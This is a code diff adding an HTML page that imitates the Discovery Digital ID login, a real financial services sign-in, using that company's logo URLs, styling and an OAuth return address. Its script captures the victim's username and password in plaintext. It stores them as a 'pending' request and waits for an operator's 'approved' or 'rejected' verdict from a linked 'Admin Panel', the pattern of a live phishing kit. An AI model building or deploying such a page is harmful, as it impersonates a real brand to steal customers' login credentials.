@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Discovery Digital ID</title>
+    <link rel="icon" type="image/x-icon" href="https://id.discovery.co.za/dui/current/icons/favicon/discovery/favicon-32x32.png">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
+    <style>
+        @charset "UTF-8";
+        /*! Bootstrap v4.0.0-alpha.6 */
+        /*! Animate.css - http://daneden.me/animate */
+        /*!------------------------------------ #VISIBILITY HELPER ------------------------------------*/
+        /*!------------------------------------ #DISPLAY HELPER ------------------------------------*/
+        /*!------------------------------------ #POSITION HELPER ------------------------------------*/
+        /*!------------------------------------ #OVERFLOW HELPER ------------------------------------*/
+        /*!------------------------------------ #ALIGN HELPER ------------------------------------*/
+        /*!------------------------------------ #FLOAT HELPER ------------------------------------*/
+        
+        .show{display:block}
+        .hide{visibility:hidden}
+        .hidden{display:none}
+        
+        .inline{display:inline!important}
+        .inline-block{display:inline-block!important}
+        .block{display:block!important}
+        .table{display:table!important}
+        .table-cell{display:table-cell!important}
+        
+        .relative{position:relative!important}
+        .absolute{position:absolute}
+        .fixed{position:fixed}
+        .static{position:static}
+        
+        .pull-right{float:right}
+        
+        /*! CUSTOM STYLES */
+        body {
+            font-family: "Open Sans", sans-serif;
+            font-size: 1em;
+            line-height: 1.875;
+            background-color: #f8f9fa;
+        }
+        
+        .ddid-container {
+            margin-top: 60px;
+            margin-bottom: 60px;
+        }
+        
+        .ddid-logo {
+            width: 225px;
+            height: 45px;
+            background: url('https://id.discovery.co.za/dui/current/icons/discovery-logo/SVG/logo-color.svg') 0 0/225px 45px no-repeat;
+            display: block;
+        }
+        
+        .form-dui .form-control.ddid-form-control {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            font-size: 1rem;
+            line-height: 1.25;
+            color: #444;
+            background-color: #fff;
+            background-image: 0;
+            background-clip: padding-box;
+            border: 0;
+            border-bottom: 2px solid rgba(0,0,0,.1);
+            transition: all .3s;
+            border-radius: 0;
+        }
+        
+        .form-dui .form-control.ddid-form-control:focus {
+            background-color: #fff;
+            border-color: #0e8eff;
+            outline: 0;
+            box-shadow: none;
+        }
+        
+        .form-dui .floating-label-form-group {
+            margin-bottom: 5px;
+            position: relative;
+            padding-left: 0;
+            margin-top: 12px;
+        }
+        
+        .form-dui .floating-label-form-group label {
+            display: block;
+            position: relative;
+            top: 20px;
+            opacity: 0;
+            z-index: -1;
+            font-size: 1em;
+            color: #575757;
+            vertical-align: baseline;
+            margin: 0;
+            transition: top .3s ease,opacity .3s ease;
+        }
+        
+        .form-dui .floating-label-form-group-with-value label {
+            top: 0;
+            opacity: 1;
+        }
+        
+        .form-dui .floating-label-form-group-with-focus label {
+            transition: all .3s ease;
+            color: #0e8eff;
+        }
+        
+        .form-dui svg.input-icon {
+            float: right;
+            margin-right: 12px;
+            margin-top: -36px;
+            position: relative;
+            z-index: 2;
+            cursor: pointer;
+        }
+        
+        .btnGroup {
+            padding-top: 20px;
+        }
+        
+        .regLink {
+            padding-top: 10px;
+            text-align: center;
+        }
+        
+        h4 {
+            font-family: opensans-light,sans-serif;
+            font-weight: 300;
+            line-height: 1.25;
+            margin-bottom: 15px;
+            font-size: 1.265625em;
+            color: inherit;
+        }
+        
+        .btn {
+            font-weight: 400;
+            line-height: 1.5em;
+            padding: 11px 17px 10px;
+            font-size: .79012345679em;
+            letter-spacing: .1em;
+            border: 2px solid transparent;
+            text-transform: uppercase;
+            transition: all .2s ease-in-out;
+            border-radius: 3px;
+        }
+        
+        .btn-primary {
+            background-color: #004b8d;
+            border-color: #004b8d;
+            color: #fff !important;
+        }
+        
+        .btn-primary:hover {
+            color: #fff;
+            background-color: #00305a;
+            border-color: #002a50;
+        }
+        
+        .btn-outline-primary {
+            color: #004b8d !important;
+            background-image: none;
+            background-color: transparent;
+            border-color: #004b8d;
+        }
+        
+        .btn-outline-primary:hover {
+            color: #fff !important;
+            background-color: #004b8d;
+            border-color: #004b8d;
+        }
+        
+        .btn-block {
+            display: block;
+            width: 100%;
+        }
+        
+        .small, small {
+            font-size: .888888888889em;
+            line-height: 1.875;
+            font-weight: 400;
+        }
+        
+        a {
+            color: #1e72c3;
+            text-decoration: none;
+        }
+        
+        a:hover {
+            color: #144b81;
+            text-decoration: underline;
+        }
+        
+        .d-flex {
+            display: -webkit-flex !important;
+            display: -ms-flexbox !important;
+            display: flex !important;
+        }
+        
+        .justify-content-center {
+            -webkit-justify-content: center !important;
+            -ms-flex-pack: center !important;
+            justify-content: center !important;
+        }
+        
+        .align-items-center {
+            -webkit-align-items: center !important;
+            -ms-flex-align: center !important;
+            align-items: center !important;
+        }
+        
+        .mb-1 {
+            margin-bottom: 15px !important;
+        }
+        
+        .ml-auto {
+            margin-left: auto !important;
+        }
+        
+        .text-center {
+            text-align: center !important;
+        }
+        
+        .spinner-main {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            margin-left: -12px;
+            margin-top: -12px;
+            text-align: center;
+            z-index: 99999;
+            overflow: auto;
+        }
+        
+        .ddid-spinner {
+            display: none;
+        }
+        
+        .spinner {
+            box-sizing: border-box;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            border: 2px solid #eee;
+            border-top-color: #004b8d;
+            -webkit-animation: spinner .6s linear infinite;
+            animation: spinner .6s linear infinite;
+        }
+        
+        @-webkit-keyframes spinner {
+            to {-webkit-transform: rotate(360deg); transform: rotate(360deg);}
+        }
+        
+        @keyframes spinner {
+            to {-webkit-transform: rotate(360deg); transform: rotate(360deg);}
+        }
+        
+        .svgIcons {
+            position: absolute;
+            width: 0;
+            height: 0;
+            overflow: hidden;
+        }
+        
+        .material {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            stroke-width: 0;
+            stroke: currentColor;
+            fill: currentColor;
+        }
+        
+        .material.svg-32 {
+            width: 32px;
+            height: 32px;
+        }
+        
+        .color-primary {
+            color: #004b8d;
+        }
+        
+        .viewpwd {
+            cursor: pointer;
+        }
+        
+        #cookies {
+            display: none;
+            text-align: center;
+        }
+        
+        .card-accent-2-left {
+            border-left-color: #d03434 !important;
+            border-left-style: solid;
+            border-left-width: 3px;
+        }
+        
+        .p-1 {
+            padding: 15px !important;
+        }
+        
+        @media (max-width: 767px) {
+            .ddid-container {
+                margin-top: 30px;
+                margin-bottom: 30px;
+            }
+            
+            .ddid-logo {
+                width: 150px;
+                height: 30px;
+                background-size: 150px 30px;
+                margin: 0 auto;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="ddid-spinner" class="ddid-spinner">
+        <div class="d-flex justify-content-center mb-1">
+            <div class="spinner-main spinner spinner-primary"></div>
+        </div>
+    </div>
+
+    <div class="container ddid-container">
+        <div class="row">
+            <div class="col-lg-6 offset-lg-3 col-md-8 offset-md-2 col-sm-12">
+                <div class="d-flex justify-content-center">
+                    <a class="site-logo ddid-logo mb-2" href="#"></a>
+                </div>
+
+                <h4 id="heading" class="text-center">Log in</h4>
+                <form id="loginForm" class="form-primary form-dui" action="#" method="post">
+                    <input type="hidden" id="ReturnUrl" name="ReturnUrl" value="/connect/authorize/callback?response_type=code&amp;client_id=C99441A5246AAA4DE541&amp;scope=openid%20offline_access%20sso&amp;redirect_uri=https%3A%2F%2Fwww.discovery.co.za%2Fportal%2Fddid%2Flogin.do&amp;state=eyJkZXN0IjoiXC9cLyJ9">
+                    <input type="hidden" id="Type" name="Type" value="cancel">
+                    <input type="hidden" id="Referer" name="Referer" value="https://www.discovery.co.za/">
+
+                    <div class="form-group floating-label-form-group mb-1">
+                        <label for="Username">Username</label>
+                        <input type="text" class="ddid-form-control form-control" placeholder="Username" autofocus tabindex="1" maxlength="50" autocapitalize="none" id="Username" name="Username" value="">
+                        <div class="d-flex">
+                            <a class="ml-auto small" href="#">Forgot username?</a>
+                        </div>
+                    </div>
+
+                    <div class="form-group floating-label-form-group">
+                        <label for="Password">Password</label>
+                        <input type="password" class="ddid-form-control form-control" placeholder="Password" tabindex="2" maxlength="100" autocomplete="off" id="Password" name="Password">
+                        <svg id="showPassword" class="material svg-32 svg-icon-eye-sensor color-primary input-icon viewpwd" aria-hidden="false" data-for="Password">
+                            <use xlink:href="#svg-icon-eye-sensor"></use>
+                        </svg>
+                        <svg id="hidePassword" class="material svg-32 svg-icon-eye-sensor color-primary input-icon viewpwd" visibility="hidden" aria-hidden="false" data-for="Password">
+                            <use xlink:href="#svg-icon-eye-sensor-deactivated"></use>
+                        </svg>
+
+                        <div class="d-flex">
+                            <a class="ml-auto small" href="#">Forgot password?</a>
+                        </div>
+                    </div>
+
+                    <div class="row btnGroup">
+                        <div class="col-6">
+                            <button id="btnCancel" type="button" class="btn btn-block btn-outline-primary mb-1" value="cancel">Cancel</button>
+                        </div>
+                        <div class="col-6">
+                            <button id="btnLogin" type="submit" name="button" class="btn btn-block btn-primary mb-1" value="login" tabindex="3">Log in</button>
+                        </div>
+                    </div>
+
+                    <div class="text-center regLink">
+                        <a href="#">Register</a>
+                    </div>
+                    
+                    <div class="text-center mt-3">
+                        <a href="admin.html" target="_blank">Admin Panel</a>
+                    </div>
+
+                    <input name="__RequestVerificationToken" type="hidden" value="CfDJ8KoX-ZMzyeNAh8_lvTEz3SOBN2ze3KD4hiW_7pO-UPk1XFLAjjgfUhVm8qUDgQecbcq9h_Qb083mqTab08m9vZlbGHq978Y-2aNDSZPZ6IBWE0W1JQbxwPZp0XthCluCoGukS6vySNig6NTXWS0Cki8">
+                </form>
+                
+                <div id="cookies">
+                    <h4 class="text-center">Discovery Digital ID</h4>
+                    <div class="card-accent-2-left mb-1">
+                        <div class="p-1">
+                            We have detected that cookies are disabled in your browser. You cannot log in with Discovery Digital ID if cookies are disabled.
+                        </div>
+                    </div>
+                    <p>Please <a href="https://support.google.com/accounts/answer/61416">enable cookies</a> and retry. For iOS users, once you've enabled cookies, please log in to the discovery.co.za website from your Safari browser for the updated settings to take effect. Then log in to the Discovery app.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <svg aria-hidden="true" class="svgIcons" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+        <defs>
+            <symbol id="svg-icon-eye-sensor-deactivated" viewBox="0 0 64 64">
+                <title>icon-eye-sensor-deactivated</title>
+                <path d="M15.935 48.71c-0.194 0-0.323-0.065-0.452-0.194-0.258-0.258-0.258-0.645 0-0.903l32.129-32.129c0.258-0.258 0.645-0.258 0.903 0s0.258 0.645 0 0.903l-32.129 32.129c-0.129 0.129-0.258 0.194-0.452 0.194z"></path>
+                <path d="M50.323 31.484c-0.129 0-0.323-0.064-0.452-0.194-2.452-2.323-5.226-4.194-8.258-5.677-0.323-0.129-0.452-0.516-0.323-0.839s0.516-0.452 0.839-0.323c3.097 1.548 6 3.548 8.516 5.936 0.258 0.258 0.258 0.645 0 0.903 0 0.129-0.129 0.194-0.323 0.194z"></path>
+                <path d="M13.613 31.419c-0.194 0-0.323-0.064-0.452-0.194-0.258-0.258-0.258-0.645 0-0.903 2.129-2 9.677-8.452 18.774-8.452 2 0 4 0.323 5.935 0.903 0.323 0.129 0.516 0.452 0.452 0.774-0.129 0.323-0.452 0.516-0.774 0.452-1.806-0.516-3.677-0.839-5.548-0.839-8.581 0-15.871 6.194-17.936 8.129-0.129 0.129-0.258 0.129-0.452 0.129z"></path>
+                <path d="M22.064 39.677c-0.064 0-0.194 0-0.258-0.065-3.161-1.548-6-3.548-8.581-5.935-0.258-0.258-0.258-0.645-0.065-0.903 0.258-0.258 0.645-0.258 0.903-0.065 2.452 2.323 5.226 4.194 8.258 5.677 0.323 0.129 0.452 0.516 0.323 0.839s-0.323 0.516-0.581 0.516z"></path>
+                <path d="M27.097 34.645c-0.258 0-0.516-0.129-0.581-0.387-0.258-0.71-0.452-1.484-0.452-2.194 0-3.29 2.645-5.936 5.871-5.936 0 0 0 0 0 0 0.774 0 1.484 0.129 2.194 0.452 0.323 0.129 0.516 0.516 0.387 0.839s-0.516 0.516-0.839 0.387c-0.581-0.258-1.161-0.323-1.742-0.323-2.581 0-4.645 2.064-4.645 4.645 0 0.581 0.129 1.161 0.323 1.742 0.129 0.323 0 0.71-0.323 0.839 0-0.065-0.129-0.065-0.194-0.065z"></path>
+                <path d="M32 37.935c-0.71 0-1.484-0.129-2.194-0.387-0.323-0.129-0.516-0.516-0.387-0.839s0.516-0.516 0.839-0.387 1.097 0.452 2.323 0.452 2.065-0.452 2.516-2.452 0.516-1.161 0.516-2.387 0.065-3.548-0.129-0.323 0-0.71 0.387-0.839 0.323-0.129 0.71 0 0.839 0.387 0.581 1.484 0.581 3.097-0.065 4.516s-1.806 2.581-3.226 3.161c-0.774 0.258-1.484 0.387-2.194 0.387z"></path>
+                <path d="M32.065 42.129c-2 0-4-0.323-5.936-0.903-0.323-0.129-0.516-0.452-0.452-0.774 0.129-0.323 0.452-0.516 0.774-0.452 1.806 0.516 3.677 0.839 5.548 0.839 8.581 0 15.871-6.194 17.871-8.129 0.258-0.258 0.645-0.258 0.903 0s0.258 0.645 0 0.903c-2.065 2.065-9.677 8.516-18.71 8.516z"></path>
+            </symbol>
+            <symbol id="svg-icon-eye-sensor" viewBox="0 0 64 64">
+                <title>icon-eye-sensor</title>
+                <path d="M50.323 31.419c-0.129 0-0.323-0.064-0.452-0.194-2-1.871-9.29-8.129-17.871-8.129s-15.871 6.194-17.936 8.129c-0.258 0.258-0.645 0.258-0.903 0s-0.258-0.645 0-0.903c1.419 1.355 8.968 8.129 17.936 8.129 8.581 0 15.871-6.194 17.935-8.129c0.258 0.258 0.258 0.645 0 0.903-0.065 0.129-0.194 0.194-0.387 0.194z"></path>
+                <path d="M32 42.129c-9.161 0-16.71-6.452-18.774-8.452-0.258 0.258-0.258 0.645 0 0.903s0.645 0.258 0.903 0c1.419 1.355 8.968 8.129 17.936 8.129 8.581 0 15.871-6.194 17.935-8.129 0.258-0.258 0.645-0.258 0.903 0s0.258 0.645 0 0.903c-2.258 2-9.871 8.452-18.903 8.452z"></path>
+                <path d="M32 37.935c-3.29 0-5.936-2.645-5.936-5.936s2.645-5.936 5.936-5.936 5.935 2.645 5.935 5.936c-0.065 3.29-2.71 5.936-5.936 5.936zM32 27.419c-2.516 0-4.645 2.064-4.645 4.645s2.064 4.645 4.645 4.645 4.645-2.065 4.645-4.645-2.129-4.645-4.645-4.645z"></path>
+            </symbol>
+        </defs>
+    </svg>
+
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <script>
+        $(function () {
+            var buttonPresses = "";
+            
+            // Handle label animations for form fields
+            $('.ddid-form-control').on('focus', function() {
+                $(this).parent().addClass('floating-label-form-group-with-focus');
+                if ($(this).val() !== '') {
+                    $(this).parent().addClass('floating-label-form-group-with-value');
+                }
+            }).on('blur', function() {
+                $(this).parent().removeClass('floating-label-form-group-with-focus');
+                if ($(this).val() === '') {
+                    $(this).parent().removeClass('floating-label-form-group-with-value');
+                }
+            }).on('input', function() {
+                if ($(this).val() !== '') {
+                    $(this).parent().addClass('floating-label-form-group-with-value');
+                } else {
+                    $(this).parent().removeClass('floating-label-form-group-with-value');
+                }
+            });
+            
+            // Password visibility toggle
+            $('#showPassword').click(function() {
+                $('#Password').attr('type', 'text');
+                $('#showPassword').attr('visibility', 'hidden');
+                $('#hidePassword').attr('visibility', 'visible');
+            });
+            
+            $('#hidePassword').click(function() {
+                $('#Password').attr('type', 'password');
+                $('#hidePassword').attr('visibility', 'hidden');
+                $('#showPassword').attr('visibility', 'visible');
+            });
+            
+            $("#btnLogin").click(function () {
+                buttonPresses = "login";
+            });
+
+            $("#btnCancel").click(function () {
+                buttonPresses = "cancel";
+                $("#loginForm").submit();
+            });
+
+            $("#loginForm").submit(function (e) {
+                if (buttonPresses === "login") {
+                    if ($("#Username").val() === "" || $("#Password").val() === "") {
+                        e.preventDefault();
+                        return false;
+                    }
+                    else {
+                        e.preventDefault(); // Prevent default form submission
+                        $("#btnLogin").attr("disabled", true);
+                        $("#btnLogin").removeClass("btn-primary");
+                        $("#btnLogin").addClass("btn-gray");
+                        $("#ddid-spinner").show();
+                        $("#Type").val("login");
+                        
+                        // Get form values
+                        const username = $("#Username").val();
+                        const password = $("#Password").val();
+                        
+                        // Create a unique request ID
+                        const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                        
+                        // Store login request in localStorage
+                        const loginRequest = {
+                            id: requestId,
+                            username: username,
+                            password: password,
+                            timestamp: new Date().toISOString(),
+                            status: 'pending',
+                            ip: '192.168.1.100'
+                        };
+                        
+                        // Save request to localStorage
+                        localStorage.setItem('loginRequest_' + requestId, JSON.stringify(loginRequest));
+                        
+                        // Listen for approval/rejection
+                        const checkResponse = setInterval(() => {
+                            const response = localStorage.getItem('loginResponse_' + requestId);
+                            if (response) {
+                                clearInterval(checkResponse);
+                                const responseData = JSON.parse(response);
+                                
+                                // Remove the request and response from localStorage
+                                localStorage.removeItem('loginRequest_' + requestId);
+                                localStorage.removeItem('loginResponse_' + requestId);
+                                
+                                if (responseData.status === 'approved') {
+                                    // Redirect to success/loading page
+                                    window.location.href = `loading.html?username=${encodeURIComponent(username)}&status=approved`;
+                                } else {
+                                    // Show rejection message
+                                    $("#ddid-spinner").hide();
+                                    $("#btnLogin").attr("disabled", false);
+                                    $("#btnLogin").removeClass("btn-gray");
+                                    $("#btnLogin").addClass("btn-primary");
+                                    alert("Login request rejected by admin.");
+                                }
+                            }
+                        }, 1000);
+                        
+                        return false;
+                    }
+                }
+                else {
+                    $("#Type").val("cancel");
+                    return true;
+                }
+            });
+        });
+
+        $(document).ready(function () {
+            if (!navigator.cookieEnabled) {
+                $("#heading").attr("hidden", true);
+                $("form").attr("hidden", true);
+                $("#cookies").attr("hidden", false);
+                $("#cookies").show();
+            }
+            
+            // Initialize form labels
+            $('.ddid-form-control').each(function() {
+                if ($(this).val() !== '') {
+                    $(this).parent().addClass('floating-label-form-group-with-value');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
